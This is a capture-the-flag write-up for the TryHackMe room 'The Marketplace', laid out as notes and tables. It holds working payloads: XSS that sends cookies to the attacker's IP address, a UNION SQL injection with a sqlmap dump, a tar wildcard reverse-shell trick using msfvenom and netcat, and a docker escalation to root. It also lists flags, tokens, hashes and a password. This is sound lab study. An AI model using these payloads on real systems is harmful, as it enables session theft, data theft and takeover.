TryHackMe The Marketplace

Mittwoch, 11. November 2020

22:52

![the-marketplace](/images/the-marketplace.png "The Marketplace")
 

Hints:
======

<table>
<thead>
<tr class="header">
<th>#</th>
<th>Hint</th>
<th>Found</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>XSS</td>
<td>in New Listing Function</td>
</tr>
<tr class="even">
<td>2</td>
<td>SQLI</td>
<td>in /admin?user=id</td>
</tr>
<tr class="odd">
<td>3</td>
<td>Docker,Web</td>
<td>see exploit details</td>
</tr>
</tbody>
</table>

 
=

Flags:
======

<table>
<thead>
<tr class="header">
<th>#</th>
<th>Found</th>
<th>Entry</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>Administration Pane (/admin)</td>
<td>THM{c37a63895910e478f28669b048c348d5}</td>
</tr>
<tr class="even">
<td>2 User Flag</td>
<td>User.txt</td>
<td>THM{c3648ee7af1369676e3e4b15da6dc0b4}</td>
</tr>
<tr class="odd">
<td>3 Root Flag</td>
<td>Root.txt</td>
<td>THM{d4f76179c80c0dcf46e0f8e43c9abd62}</td>
</tr>
</tbody>
</table>

 

Host Discovery:
===============

 

<table>
<thead>
<tr class="header">
<th><blockquote>
<p> </p>
</blockquote></th>
<th>Scanned</th>
<th>Done</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>IP#1</td>
<td>yes </td>
<td>yes </td>
</tr>
</tbody>
</table>

 

<table>
<thead>
<tr class="header">
<th>IP#1</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><table>
<thead>
<tr class="header">
<th>Port</th>
<th>Service</th>
<th>Software/<br />
Version</th>
<th>Credentials</th>
<th>Done</th>
<th><p>Flag/Step</p>
<p>Solution</p></th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>22</td>
<td>SSH</td>
<td> </td>
<td><table>
<thead>
<tr class="header">
<th>Username</th>
<th>jake</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Password</td>
<td>@b_ENXkGYUCAv3zJ</td>
</tr>
</tbody>
</table></td>
<td><blockquote>
<p> </p>
</blockquote></td>
<td><p>Flag#2</p>
<p>Flag#3</p></td>
<td> </td>
</tr>
<tr class="even">
<td>80</td>
<td>HTTP</td>
<td>nginx 1.19.2</td>
<td> </td>
<td><blockquote>
<p> </p>
</blockquote></td>
<td>Flag #1</td>
<td> </td>
</tr>
</tbody>
</table></td>
</tr>
</tbody>
</table>

 

<table>
<thead>
<tr class="header">
<th><ol type="1">
<li><blockquote>
<p>SSH -&gt; local System (Linux)</p>
</blockquote></li>
</ol></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><table>
<thead>
<tr class="header">
<th>Login (username:passwd)</th>
<th>Findings</th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>jake:@b_ENXkGYUCAv3zJ</td>
<td><table>
<thead>
<tr class="header">
<th># </th>
<th>CVE</th>
<th>PoC</th>
<th>Exploit</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><p>Vuln#1</p>
<p> </p></td>
<td>Tar Wildcard Exploit</td>
<td><p>$sudo -l</p>
<p><strong>Reveals</strong></p>
<p>(michael) NOPASSWD: /opt/backups/backup.sh</p></td>
<td><p>$touch -- "--checkpoint=1"</p>
<p>$touch -- "--checkpoint-action=exec=sh shell.sh"</p>
<p>$touch shell.sh</p>
<p>$sudo -u michael ./backup.sh</p>
<p>@attacker</p>
<p>$echo "msfvenom -p cmd/unix/reverse_netcat lhost=&lt;attacker_ip&gt; lport=4444 R" &gt; shell.sh</p>
<p>#Transfer shell.sh to victim (can also just copy the contents and create a local #file at the victim side)</p>
<p>$nc -lvnp 4444</p></td>
</tr>
<tr class="even">
<td>Vuln#2</td>
<td>Docker</td>
<td><p><strong>Prerequisite: shell as user that is in group 'docker'</strong></p>
<p> </p></td>
<td><p><a href="https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17">https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17</a></p>
<p>$docker run -v /root:/mnt alpine cat /mnt/root.txt</p>
<p><em> </em></p>
<p> </p>
<p> </p></td>
</tr>
</tbody>
</table></td>
<td><p>Flag#2</p>
<p>Flag#3</p></td>
</tr>
</tbody>
</table></td>
</tr>
</tbody>
</table>

 

<table>
<thead>
<tr class="header">
<th>80</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><table>
<thead>
<tr class="header">
<th>Path</th>
<th>Contents</th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>/new</td>
<td><table>
<thead>
<tr class="header">
<th><blockquote>
<p> </p>
</blockquote></th>
<th><blockquote>
<p>CVE</p>
</blockquote></th>
<th>PoC</th>
<th>Exploit</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Vuln#1</td>
<td>XSS Reflection in Title Parameter</td>
<td><ol type="1">
<li><blockquote>
<p>Create Login</p>
</blockquote></li>
<li><blockquote>
<p>Go to New Listing</p>
</blockquote></li>
<li><blockquote>
<p>Create POST Request with body: title=&lt;script&gt;new Image().src="http://10.8.33.103:8000/bogus.php?output="+document.cookie;&lt;/script&gt;&amp;description=t</p>
</blockquote></li>
<li><blockquote>
<p>Setup HTTP Server at attacker side with $python -m SimpleHTTPServer</p>
</blockquote></li>
<li><blockquote>
<p>Abuse the report listing to admins function</p>
</blockquote></li>
<li><blockquote>
<p>Wait until admin clicks on link and triggers the fake request</p>
</blockquote></li>
<li><blockquote>
<p>REQUEST: 10.10.25.186 - - [11/Nov/2020 23:33:28] "GET /bogus.php?output=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDUxMzQwMDl9.xHb7HrszWJcb9lHRwDRlgq_ZfiAs7CFQp2b6BkNPZBE HTTP/1.1" 404 -</p>
</blockquote></li>
</ol>
<p>Replace the token in your cookies to get an admin session</p></td>
<td>n.E</td>
</tr>
<tr class="even">
<td>Vuln#2</td>
<td>Session Hijacking</td>
<td>Abusing intended report listing to admins feature. Details in Vuln#1</td>
<td>n.E</td>
</tr>
</tbody>
</table></td>
<td>Found Flag#1</td>
</tr>
<tr class="even">
<td><p>/admin</p>
<p>(only valid if logged in as admin)</p></td>
<td><table>
<thead>
<tr class="header">
<th><blockquote>
<p> </p>
</blockquote></th>
<th><blockquote>
<p>CVE</p>
</blockquote></th>
<th>PoC</th>
<th>Exploit</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Vuln#1</td>
<td>SQL Injection in URL</td>
<td><p><em>I tried different payloads to get information about the table exact table name and guessed the columns</em></p>
<p> </p>
<p><a href="http://thm/admin?user=3">http://thm/admin?user=3</a> UNION select password,username,null,isadministrator from users where id = 2 order by id</p>
<p> </p>
<p>URL ENCODE</p>
<p>----------------------------------------------</p>
<p><a href="http://thm/admin?user=3eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDUyMDY4MzF9.r4QOEyUEdvDuN4Lth1QMiuHulPy0pyFDYUFuJn6sh80">http://thm/admin?user=3eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDUyMDY4MzF9.r4QOEyUEdvDuN4Lth1QMiuHulPy0pyFDYUFuJn6sh80</a></p>
<p>----------------------------------------------</p>
<p>RETURNS</p>
<p>User $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q</p>
<p>User michael</p>
<p>ID: $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q</p>
<p>Is administrator: true</p>
<p> </p>
<p>User $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG</p>
<p>User jake</p>
<p>ID: $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG</p>
<p>Is administrator: true</p>
<p> </p>
<p>Using <a href="https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</a></p>
<p><strong>Cracking seems to be a rabbit hole!</strong></p>
<p>________________________________________________________________________</p>
<p>Trying to read the messages table:</p>
<p> </p>
<p>sqlmap <a href="http://thm/admin?user=3">http://thm/admin?user=3</a> --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDUyMDc3NjZ9.kgzjOrNeYWKffj5v8Vk-LzMNnQgXG9ZNieHmvsh0l1I' --delay=3 -dump --technique=U --proxy="http://localhost:8080" -T "messages"</p>
<p>Database: marketplace</p>
<p>Table: messages</p>
<p>[11 entries]</p>
<p>+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</p>
<p>| id | is_read | user_to | user_from | message_content |</p>
<p>+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</p>
<p>| 1 | 1 | 3 | 1 | Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: @b_ENXkGYUCAv3zJ</p></td>
<td> </td>
</tr>
</tbody>
</table>
<p> </p></td>
<td><p>Found Password Hashes,</p>
<p>Found SSL Password in Message Table</p></td>
</tr>
<tr class="odd">
<td><p>/.hta (Status: 403)</p>
<p>/.htaccess (Status: 403)</p>
<p>/.htpasswd (Status: 403)</p>
<p>/images (Status: 301)</p>
<p>/login (Status: 200)</p>
<p>/Login (Status: 200)</p>
<p>/messages (Status: 302)</p>
<p>/new (Status: 302)</p>
<p>/robots.txt (Status: 200)</p>
<p>/signup (Status: 200)</p>
<p>/stylesheets (Status: 301)</p></td>
<td></td>
<td> </td>
</tr>
</tbody>
</table></td>
</tr>
</tbody>
</table>

 

Users
=====

<table>
<thead>
<tr class="header">
<th>ID</th>
<th>Username</th>
<th>Password</th>
<th>Hash</th>
<th>Hash Algorithm</th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>3</td>
<td>jake</td>
<td>@b_ENXkGYUCAv3zJ</td>
<td>$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG</td>
<td><p>Possible algorithms: bcrypt $2*$, Blowfish (Unix)</p>
<p> </p></td>
<td>Administrator</td>
</tr>
<tr class="even">
<td>2</td>
<td>michael</td>
<td>???</td>
<td>$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q</td>
<td><p>Possible algorithms: bcrypt $2*$, Blowfish (Unix)</p>
<p> </p></td>
<td>Administrator</td>
</tr>
</tbody>
</table>

 

**Legend**

<table>
<thead>
<tr class="header">
<th> </th>
<th> </th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> </td>
<td><blockquote>
<p>Rabbit Hole</p>
</blockquote></td>
</tr>
</tbody>
</table>

 
=

 

 

 
